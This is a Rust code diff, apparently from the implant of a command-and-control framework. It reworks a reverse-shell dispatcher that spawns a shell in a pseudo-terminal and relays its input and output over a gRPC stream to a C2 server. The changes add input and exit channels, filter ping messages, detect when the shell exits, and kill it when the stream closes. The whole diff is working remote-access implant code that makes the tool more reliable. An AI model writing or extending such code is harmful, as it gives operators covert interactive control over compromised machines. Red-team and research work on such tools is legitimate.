@@ -3,10 +3,11 @@ use anyhow::Result;
 use pb::c2::{ReverseShellMessageKind, ReverseShellRequest};
 use portable_pty::{native_pty_system, CommandBuilder, PtySize};
 use std::path::Path;
+use tokio::sync::mpsc::error::TryRecvError;
 use transport::Transport;
 
 /*
- * ReverseShellMessage will open a reverse shell when dispatched.
+ * ReverseShellPTYMessage will open a reverse shell when dispatched.
  */
 #[cfg_attr(debug_assertions, derive(Debug))]
 #[derive(Clone)]
@@ -53,13 +54,16 @@ impl Dispatcher for ReverseShellPTYMessage {
 
         // Appologies for the exclusionary language in the portable_pty dependency :(
         // We welcome PRs to replace this dependency / wrap it in more inclusive language
-        let _child = pair.slave.spawn_command(cmd)?;
+        // It would also be great to not spawn a shell as a child process
+        let mut child = pair.slave.spawn_command(cmd)?;
         let mut reader = pair.master.try_clone_reader()?;
         let mut writer = pair.master.take_writer()?;
 
         // Buffer must only be 1
         // gRPC will only send when buffer is over-filled
         let (output_tx, output_rx) = tokio::sync::mpsc::channel(1);
+        let (input_tx, mut input_rx) = tokio::sync::mpsc::channel(1);
+        let (exit_tx, mut exit_rx) = tokio::sync::mpsc::channel(1);
 
         // Spawn task to send PTY output
         const CHUNK_SIZE: usize = 1024; // 1 KB Limit (/chunk)
@@ -76,6 +80,29 @@ impl Dispatcher for ReverseShellPTYMessage {
                         break;
                     }
                 };
+
+                // When no output is read, check if PTY has exited
+                if n < 1 {
+                    match exit_rx.try_recv() {
+                        // Still Running
+                        Ok(None) => {}
+                        Err(TryRecvError::Empty) => {}
+
+                        // Exited
+                        Ok(Some(_status)) => {
+                            #[cfg(debug_assertions)]
+                            log::info!("closing output stream, pty exited: {}", _status);
+
+                            break;
+                        }
+                        Err(TryRecvError::Disconnected) => {
+                            #[cfg(debug_assertions)]
+                            log::info!("closing output stream, exit channel closed");
+                        }
+                    }
+
+                    continue;
+                }
 
                 // Send output to gRPC
                 match output_tx
@@ -118,20 +145,44 @@ impl Dispatcher for ReverseShellPTYMessage {
             }
         });
 
-        // Wrap PTY output receiver in stream
-        let req_stream = tokio_stream::wrappers::ReceiverStream::new(output_rx);
-
         // Initiate gRPC stream
-        let mut stream = transport.reverse_shell(req_stream).await?.into_inner();
-        while let Some(msg) = stream.message().await? {
-            match writer.write_all(&msg.data) {
-                Ok(_) => {}
-                Err(_err) => {
-                    #[cfg(debug_assertions)]
-                    log::error!("reverse_shell_pty failed to write input: {}", _err);
+        transport.reverse_shell(output_rx, input_tx).await?;
+
+        // Handle Input
+        loop {
+            // Exit if the PTY is closed
+            if let Ok(Some(_status)) = child.try_wait() {
+                #[cfg(debug_assertions)]
+                log::info!("closing input stream, pty exited: {}", _status);
+
+                break;
+            }
+
+            // Write gRPC input to PTY
+            if let Some(msg) = input_rx.recv().await {
+                // Skip Pings
+                if msg.kind.into() == pb::c2::ReverseShellMessageKind::Ping {
+                    continue;
                 }
-            };
+
+                // Write Data
+                match writer.write_all(&msg.data) {
+                    Ok(_) => {}
+                    Err(_err) => {
+                        #[cfg(debug_assertions)]
+                        log::error!("reverse_shell_pty failed to write input: {}", _err);
+                    }
+                };
+            } else {
+                // gRPC is closed, time to kill the PTY
+                child.kill()?;
+                break;
+            }
         }
+
+        // Wait for PTY to exit
+        let status = child.wait()?;
+        exit_tx.send(Some(status)).await?;
 
         #[cfg(debug_assertions)]
         log::info!("stopping reverse_shell_pty (task_id={})", task_id);
